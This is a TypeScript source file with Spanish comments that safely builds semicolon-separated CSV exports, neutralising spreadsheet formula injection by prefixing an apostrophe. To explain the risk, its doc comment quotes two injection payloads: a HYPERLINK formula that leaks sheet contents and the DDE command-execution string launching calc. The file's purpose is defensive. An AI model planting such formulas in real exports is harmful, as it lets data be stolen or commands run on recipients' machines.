/**
 * El ÚNICO sitio donde se arma un CSV.
 *
 * Había dos copias de esta función —una para los listados del tablero y otra para el parte de
 * obra— y las dos hacían lo mismo a medias. Una copia repetida es una copia que un día se arregla
 * sola por un lado.
 */

/**
 * Los cuatro caracteres con los que Excel, LibreOffice y Google Sheets entienden que una celda
 * es una FÓRMULA y no un texto.
 *
 * `+` y `-` están porque también arrancan fórmula (`-2+3` da 1), y `@` porque es como se llama a
 * una función en el Excel viejo.
 */
const ARRANQUE_DE_FORMULA = /^[=+\-@＝＋－＠]/;

/** Sólo para inspección: algunas hojas ignoran estos prefijos antes de interpretar la fórmula. */
const PREFIJO_IGNORABLE = /^[\u0000-\u0020\u007f\u00a0\ufeff]*/;
const ARRANQUE_INVISIBLE = /^[\t\r\n\u0000]/;
const NUMERO_DECIMAL = /^[+-]?(?:\d+(?:[.,]\d*)?|[.,]\d+)(?:[eE][+-]?\d+)?$/;

/** Marca UTF-8 que Excel para Windows necesita al abrir un CSV directamente. */
export const BOM_UTF8 = '\uFEFF';

/**
 * Deja una celda como TEXTO, pase lo que pase.
 *
 * Un CSV es texto plano y la hoja de cálculo se lo cree entero. Si una celda empieza por `=`, al
 * abrir el archivo Excel no enseña ese texto: EJECUTA lo que ponga. Aquí eso no es teórico: el
 * parte de obra lleva la nota que se escribe en la cubierta y la lista de materiales lleva la
 * descripción de cada aparato, que puede venir de un proyecto que mandó otro. Una nota que diga
 *
 *     =HYPERLINK("http://…?"&A1;"pincha aquí")
 *
 * se convierte, al abrir el parte que se manda por correo, en un enlace que se lleva el contenido
 * de la hoja. Y `=cmd|'/c calc'!A1` es el clásico de los DDE.
 *
 * Se antepone un apóstrofo si el primer contenido significativo puede ser fórmula, sin recortar
 * ni cambiar el valor fuente. También se protege un control inicial que un importador pudiera
 * interpretar como separador. No hay un escape universal entre Excel, Calc y otros importadores:
 * el apóstrofo puede verse en algunos de ellos y una hoja que se reexporta debe tratarse de nuevo
 * como entrada no fiable. Esta política conserva el CSV como intercambio de texto legible.
 *
 * Un número normal (`-5`, `+3`) sí lleva signo, y por eso se deja pasar: lo que se neutraliza es
 * lo que empieza por signo y NO es un número.
 */
export function celdaSegura(valor: string | number | undefined): string {
	if (valor === undefined || valor === null) return '';
	const s = String(valor);
	if (s === '') return '';
	// Un número de verdad no es una fórmula: «-5», «+3,5» y «-1.2e3» se quedan como están.
	if (typeof valor === 'number' || NUMERO_DECIMAL.test(s)) return s;
	const contenido = s.replace(PREFIJO_IGNORABLE, '');
	const prefijo = s.slice(0, s.length - contenido.length);
	if (/^ +$/.test(prefijo) && NUMERO_DECIMAL.test(contenido)) return s;
	return ARRANQUE_DE_FORMULA.test(contenido) || ARRANQUE_INVISIBLE.test(s) ? `'${s}` : s;
}

/**
 * Arma un CSV con `;` de separador —el que espera Excel en español— y comillas donde hagan falta.
 *
 * Cada celda pasa antes por `celdaSegura`.
 */
export function aCSV(filas: (string | number | undefined)[][]): string {
	return BOM_UTF8 + filas
		.map((fila) => fila
			.map((celda) => {
				const s = celdaSegura(celda);
				return /[";\r\n]/.test(s) ? `"${s.replaceAll('"', '""')}"` : s;
			})
			.join(';'))
		.join('\n');
}
